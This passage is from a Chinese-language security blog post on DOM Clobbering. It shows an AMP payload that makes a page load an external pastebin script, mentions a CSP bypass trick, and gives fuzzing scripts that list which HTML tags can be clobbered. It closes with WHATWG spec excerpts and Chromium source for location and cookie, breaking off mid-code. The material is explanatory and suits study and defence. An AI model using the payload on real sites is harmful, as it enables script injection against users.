class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们可以用 Dom Clobbering 来让它加载我们任意的 js 文件，直接劫持<code>protocol</code>到我们任意 URL，再利用<code>#</code>注释掉后面的即可。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"AMP_MODE"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"AMP_MODE"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"localDev"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"AMP_MODE"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"test"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"testLocation"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"testLocation"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"protocol"</span></span></span><br><span class="line"><span class="hljs-tag">   <span class="hljs-attr">href</span>=<span class="hljs-string">"https://pastebin.com/raw/0tn8z0rG#"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然 URL 构造出来了，但是 Google 还有 CSP</p><p></p><figure class="highlight gams hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="hljs-string">'none'</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">script</span></span>-src <span class="hljs-string">'sha512-oQwIl...=='</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/rtv/</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0.js</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然他当时没绕过，但是 Google 还是全额地给了他奖金。</p><p>另外这个 CSP 可以利用<code>..%252f</code>的 trick 进行绕过，由于不属于这篇文章的范围，这里就不详述了，感兴趣的同学可自行搜索。</p><p>这里由于篇幅关系，就不再列举更多的例子了，我会把最近自己做的一些 XSS Game 中涉及到 Dom Clobbering 的部分以 Tip 的形式写出来。</p><h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>既然我们一开始提到过或许可以覆盖某些属性，那么我们可不可以覆盖或者说完全控制<code>document.cookie</code>呢？究竟我们可以覆盖哪些呢？又可以怎么利用呢？哪些可以用 ID 哪些用 Name呢？</p><p>接下来我们来看最后一个问题：哪些用 id 哪些用 name ？</p><h3 id="Document-amp-Id"><a href="#Document-amp-Id" class="headerlink" title="Document &amp; Id"></a>Document &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"div"</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">"&lt;"</span> + html[i] + <span class="hljs-string">" id=x &gt;"</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'x'</span>) &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以得到只有<code>object</code>标签<code>document</code>可以通过 id 进行直接获取</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">"object"</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name"><a href="#Document-amp-Name" class="headerlink" title="Document &amp; Name"></a>Document &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">"x"</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以得到以下五个元素可以让<code>document</code>通过 name 进行直接获取</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&nbsp;[<span class="hljs-string">"embed"</span>, <span class="hljs-string">"form"</span>, <span class="hljs-string">"image"</span>, <span class="hljs-string">"img"</span>, <span class="hljs-string">"object"</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name-amp-Id"><a href="#Document-amp-Name-amp-Id" class="headerlink" title="Document &amp; Name &amp; Id"></a>Document &amp; Name &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"div"</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">"&lt;"</span> + html[i] + <span class="hljs-string">" id=x name=y &gt;"</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    <span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">"y"</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br><span class="line">  ) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以得到一下三个元素：</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">"image"</span>, <span class="hljs-string">"img"</span>, <span class="hljs-string">"object"</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Id"><a href="#Window-amp-Id" class="headerlink" title="Window &amp; Id"></a>Window &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"div"</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">"&lt;"</span> + html[i] + <span class="hljs-string">" id=x &gt;"</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'x'</span>) &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>除了在 [Not Clobbered](#Not Clobbered) 部分的标签，其他标签<code>window</code>均可通过 id 进行直接获取</p><p></p><figure class="highlight scheme hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name">128</span>) [<span class="hljs-string">"a"</span>, <span class="hljs-string">"abbr"</span>, <span class="hljs-string">"acronym"</span>, <span class="hljs-string">"address"</span>, <span class="hljs-string">"applet"</span>, <span class="hljs-string">"area"</span>, <span class="hljs-string">"article"</span>, <span class="hljs-string">"aside"</span>, <span class="hljs-string">"audio"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"base"</span>, <span class="hljs-string">"basefont"</span>, <span class="hljs-string">"bdi"</span>, <span class="hljs-string">"bdo"</span>, <span class="hljs-string">"bgsound"</span>, <span class="hljs-string">"big"</span>, <span class="hljs-string">"blink"</span>, <span class="hljs-string">"blockquote"</span>, <span class="hljs-string">"br"</span>, <span class="hljs-string">"button"</span>, <span class="hljs-string">"canvas"</span>, <span class="hljs-string">"center"</span>, <span class="hljs-string">"cite"</span>, <span class="hljs-string">"code"</span>, <span class="hljs-string">"command"</span>, <span class="hljs-string">"content"</span>, <span class="hljs-string">"data"</span>, <span class="hljs-string">"datalist"</span>, <span class="hljs-string">"dd"</span>, <span class="hljs-string">"del"</span>, <span class="hljs-string">"details"</span>, <span class="hljs-string">"dfn"</span>, <span class="hljs-string">"dialog"</span>, <span class="hljs-string">"dir"</span>, <span class="hljs-string">"div"</span>, <span class="hljs-string">"dl"</span>, <span class="hljs-string">"dt"</span>, <span class="hljs-string">"element"</span>, <span class="hljs-string">"em"</span>, <span class="hljs-string">"embed"</span>, <span class="hljs-string">"fieldset"</span>, <span class="hljs-string">"figcaption"</span>, <span class="hljs-string">"figure"</span>, <span class="hljs-string">"font"</span>, <span class="hljs-string">"footer"</span>, <span class="hljs-string">"form"</span>, <span class="hljs-string">"h1"</span>, <span class="hljs-string">"header"</span>, <span class="hljs-string">"hgroup"</span>, <span class="hljs-string">"hr"</span>, <span class="hljs-string">"i"</span>, <span class="hljs-string">"iframe"</span>, <span class="hljs-string">"iframes"</span>, <span class="hljs-string">"image"</span>, <span class="hljs-string">"img"</span>, <span class="hljs-string">"input"</span>, <span class="hljs-string">"ins"</span>, <span class="hljs-string">"isindex"</span>, <span class="hljs-string">"kbd"</span>, <span class="hljs-string">"keygen"</span>, <span class="hljs-string">"label"</span>, <span class="hljs-string">"legend"</span>, <span class="hljs-string">"li"</span>, <span class="hljs-string">"link"</span>, <span class="hljs-string">"listing"</span>, <span class="hljs-string">"main"</span>, <span class="hljs-string">"map"</span>, <span class="hljs-string">"mark"</span>, <span class="hljs-string">"marquee"</span>, <span class="hljs-string">"menu"</span>, <span class="hljs-string">"menuitem"</span>, <span class="hljs-string">"meta"</span>, <span class="hljs-string">"meter"</span>, <span class="hljs-string">"multicol"</span>, <span class="hljs-string">"nav"</span>, <span class="hljs-string">"nextid"</span>, <span class="hljs-string">"nobr"</span>, <span class="hljs-string">"noembed"</span>, <span class="hljs-string">"noframes"</span>, <span class="hljs-string">"noscript"</span>, <span class="hljs-string">"object"</span>, <span class="hljs-string">"ol"</span>, <span class="hljs-string">"optgroup"</span>, <span class="hljs-string">"option"</span>, <span class="hljs-string">"output"</span>, <span class="hljs-string">"p"</span>, <span class="hljs-string">"param"</span>, <span class="hljs-string">"picture"</span>, <span class="hljs-string">"plaintext"</span>, <span class="hljs-string">"pre"</span>, <span class="hljs-string">"progress"</span>, <span class="hljs-string">"q"</span>, <span class="hljs-string">"rb"</span>, <span class="hljs-string">"rp"</span>, <span class="hljs-string">"rt"</span>, <span class="hljs-string">"rtc"</span>, <span class="hljs-string">"ruby"</span>, <span class="hljs-string">"s"</span>, <span class="hljs-string">"samp"</span>, <span class="hljs-string">"script"</span>,&nbsp;…]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Name"><a href="#Window-amp-Name" class="headerlink" title="Window &amp; Name"></a>Window &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">"x"</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里与 document 一致，只有五个标签可以让<code>window</code>通过 name 进行直接获取</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&nbsp;[<span class="hljs-string">"embed"</span>, <span class="hljs-string">"form"</span>, <span class="hljs-string">"image"</span>, <span class="hljs-string">"img"</span>, <span class="hljs-string">"object"</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="‘Not-Clobbered’"><a href="#‘Not-Clobbered’" class="headerlink" title="‘Not Clobbered’"></a>‘Not Clobbered’</h3><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">"body"</span>, <span class="hljs-string">"caption"</span>, <span class="hljs-string">"col"</span>, <span class="hljs-string">"colgroup"</span>, <span class="hljs-string">"frame"</span>, <span class="hljs-string">"frameset"</span>, <span class="hljs-string">"head"</span>, <span class="hljs-string">"html"</span>, <span class="hljs-string">"tbody"</span>, <span class="hljs-string">"td"</span>, <span class="hljs-string">"tfoot"</span>, <span class="hljs-string">"th"</span>, <span class="hljs-string">"thead"</span>, <span class="hljs-string">"tr"</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><p>PS: 这部分并不是真正不能 Clobbered ，因为比如说<code>body</code>，因为我本身界面存在一个<code>body</code>标签，只是在我测试构建的简单的 HTML 页面中，这些标签不能被 Clobbered ，而且在实际中也用到比较少。并且根据 Chromium 中的说法是”but anything by id”，所以如果需要通过<code>Window.id</code>的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。</p><h3 id="Dom-Doc"><a href="#Dom-Doc" class="headerlink" title="Dom Doc"></a>Dom Doc</h3><p>其实在 Dom 标准中也有提及过这部分，在<a href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-currentscript" target="_blank" rel="noopener">A part of Document interface</a> 这一段中，我们可以看到有相关规定：</p><blockquote><p>​    The <code>Document</code> interface <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Document</code> object document at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates, and with values from <code>id</code> attributes coming before values from <code>name</code> attributes when the same element contributes both:</p><ul><li>the value of the <code>name</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>embed</code>, <code>form</code>, <code>iframe</code>, <code>img</code>, and <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>;</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <code>img</code> elements that have both a non-empty <code>id</code> content attribute and a non-empty <code>name</code> content attribute, and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><p>也有关于<a href="https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object" target="_blank" rel="noopener"> Window 对象的部分</a>：</p><blockquote><p>​    The <code>Window</code> object <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Window</code> object window at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates:</p><ul><li>window’s <a href="https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set" target="_blank" rel="noopener">document-tree child browsing context name property set</a>;</li><li>the value of the <code>name</code> content attribute for all <code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window’s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/infrastructure.html#html-elements" target="_blank" rel="noopener">HTML elements</a> that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window’s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>关于 window 对象，虽然 window 对象可以通过 id 直接获取标签，但是我目前还没发现可以直接通过标签 id 进行 clobber 的属性，毕竟是基于 Dom 的攻击技术。</p><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p>至于 Document 对象，我列举了一下 Document 对象特有的属性以及其对应的类型：</p><table><thead><tr><th>Class</th><th>Attr</th></tr></thead><tbody><tr><td>DOMImplementation</td><td>[“implementation”]</td></tr><tr><td>HTMLCollection</td><td>[“images”, “embeds”, “plugins”, “links”, “forms”, “scripts”, “anchors”, “applets”, “children”]</td></tr><tr><td>String</td><td>[“documentURI”, “compatMode”, “characterSet”, “charset”, “inputEncoding”, “contentType”, “domain”, “referrer”, “cookie”, “lastModified”, “readyState”, “title”, “dir”, “designMode”, “fgColor”, “linkColor”, “vlinkColor”, “alinkColor”, “bgColor”, “visibilityState”, “webkitVisibilityState”, “nodeName”, “baseURI”]</td></tr><tr><td>HTMLBodyElement</td><td>[“body”, “activeElement”]</td></tr><tr><td>HTMLHeadElement</td><td>[“head”]</td></tr><tr><td>HTMLScriptElement</td><td>[“currentScript”]</td></tr><tr><td>HTMLAllCollection</td><td>[“all”]</td></tr><tr><td>NodeList</td><td>[“childNodes”]</td></tr><tr><td>Window</td><td>[“defaultView”]</td></tr><tr><td>DocumentType</td><td>[“doctype”, “firstChild”]</td></tr><tr><td>Boolean</td><td>[“xmlStandalone”, “hidden”, “wasDiscarded”, “webkitHidden”, “fullscreenEnabled”, “fullscreen”, “webkitIsFullScreen”, “webkitFullscreenEnabled”, “pictureInPictureEnabled”, “isConnected”]</td></tr><tr><td>FontFaceSet</td><td>[“fonts”]</td></tr><tr><td>StyleSheetList</td><td>[“styleSheets”]</td></tr><tr><td>Function</td><td>[“getElementsByTagName”, “getElementsByTagNameNS”, “getElementsByClassName”, “createDocumentFragment”, “createTextNode”, “createCDATASection”, “createComment”, “createProcessingInstruction”, “importNode”, “adoptNode”, “createAttribute”, “createAttributeNS”, “createEvent”, “createRange”, “createNodeIterator”, “createTreeWalker”, “getElementsByName”, “write”, “writeln”, “hasFocus”, “execCommand”, “queryCommandEnabled”, “queryCommandIndeterm”, “queryCommandState”, “queryCommandSupported”, “queryCommandValue”, “clear”, “exitPointerLock”, “createElement”, “createElementNS”, “caretRangeFromPoint”, “elementFromPoint”, “elementsFromPoint”, “getElementById”, “prepend”, “append”, “querySelector”, “querySelectorAll”, “exitFullscreen”, “webkitCancelFullScreen”, “webkitExitFullscreen”, “createExpression”, “createNSResolver”, “evaluate”, “registerElement”, “exitPictureInPicture”, “hasChildNodes”, “getRootNode”, “normalize”, “cloneNode”, “isEqualNode”, “isSameNode”, “compareDocumentPosition”, “contains”, “lookupPrefix”, “lookupNamespaceURI”, “isDefaultNamespace”, “insertBefore”, “appendChild”, “replaceChild”, “removeChild”]</td></tr><tr><td>NodeList</td><td>[“childNodes”]</td></tr><tr><td>Array</td><td>[“adoptedStyleSheets”]</td></tr><tr><td>FeaturePolicy</td><td>[“featurePolicy”]</td></tr><tr><td>Null</td><td>[“xmlEncoding”, “xmlVersion”, “onreadystatechange”, “onpointerlockchange”, “onpointerlockerror”, “onbeforecopy”, “onbeforecut”, “onbeforepaste”, “onfreeze”, “onresume”, “onsecuritypolicyviolation”, “onvisibilitychange”, “oncopy”, “oncut”, “onpaste”, “pointerLockElement”, “fullscreenElement”, “onfullscreenchange”, “onfullscreenerror”, “webkitCurrentFullScreenElement”, “webkitFullscreenElement”, “onwebkitfullscreenchange”, “onwebkitfullscreenerror”, “rootElement”, “pictureInPictureElement”, “ownerDocument”, “parentNode”, “parentElement”, “previousSibling”, “nextSibling”, “nodeValue”, “textContent”]</td></tr></tbody></table><p>其中，<code>HTMLBodyElement</code>/<code>HTMLHeadElement</code>/<code>HTMLScriptElement</code> 均继承自<code>HTMLElement</code>，为什么需要这些呢？因为在很多时候我们 Clobber 得到的就是一个<code>HTMLElement</code>，而 Document 某些属性得到的也是一个<code>HTMLElement</code>，所以这时候我们可以直接利用。</p><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>我想如果能覆盖的话，应该就是在调用<code>document.x</code>的时候， Dom 树解析得到的结果要优先于<code>document</code>自己本身属性，所以产生了这样的结果，但是这里也有一个问题，就是为什么我们在覆盖<code>cookie</code>的时候却不能完全控制覆盖呢？</p><p>带着这些疑问，我特地去看了一会 chromium 的源码，简略地看了一下这些实现，主要在 chromium 的 blink 部分。由于自己知识浅薄，并没有完整地阅读过 chromium 源码，这里还可能设计到一些编译原理的知识，所以我并没有安全把整个 Chromium 产生这个问题的缘由以代码追踪的形式弄出来，如果要弄的话估计也得去 debug Chromium ，那就是另一篇文章的内容了，所以这个部分还有待继续研究，不过我把自己看的一些有用的部分写出来。如果有兴趣的朋友可以联系我一起研究看看。（虽然我很菜XD</p><p>全部代码来源于 <a href="https://source.chromium.org/" target="_blank" rel="noopener">Chomiunm Code Search</a>，这个平台可以比较方便审代码。</p><h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><p>首先我们来看看<code>location</code>，我们既可以使用<code>window.location</code>也可以使用<code>document.location</code>拿到<code>location</code>，这也能说明我们为什么上文要单独 fuzz Document 特有的属性而不是全部属性了。</p><p>在 Chromium 源码中，找到<code>location</code>比较简单， Chromium 直接调用了<code>window</code>对象的<code>location()</code>，所以我们就覆盖不了。</p><p>在<code>third_party/blink/renderer/core/dom/document.cc</code>中，第 933 行中有相关定义 <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=933?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">Document::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">Document::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetFrame())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> domWindow()-&gt;location();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到，直接调用了<code>domWindow()</code>来获取<code>location</code>，在<code>third_party/blink/renderer/core/frame/dom_window.cc</code>中，第85行有相关定义 <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/frame/dom_window.cc;drc=7e3843b722bda29c236e9cb49111f3296dc2ce20;l=85" target="_blank" rel="noopener">DOMWindow::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">DOMWindow::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!location_)</span><br><span class="line">    location_ = MakeGarbageCollected&lt;Location&gt;(<span class="hljs-keyword">const_cast</span>&lt;DOMWindow*&gt;(<span class="hljs-keyword">this</span>));</span><br><span class="line">  <span class="hljs-keyword">return</span> location_.Get();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>另外，有人提过相关用其他 hook 的方式 <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=315760" target="_blank" rel="noopener">Issue 315760: document.domain can be hooked</a>，里面提到可以 hook 到 domain 跟 location ，但是我在目前 stable chrome 上测试只能 hook 到 domain ，至于 location 不知道是不是被修了，尽管回复的是”Browsers allow hooking these properties. It doesn’t matter”</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>这里简单看了一下 Cookie 的实现，主要是这两部分代码：</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=5798" target="_blank" rel="noopener">Document::cookie</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">Document::cookie</span><span class="hljs-params">(ExceptionState&amp; exception_state)</span> <span class="hljs-keyword">const</span> 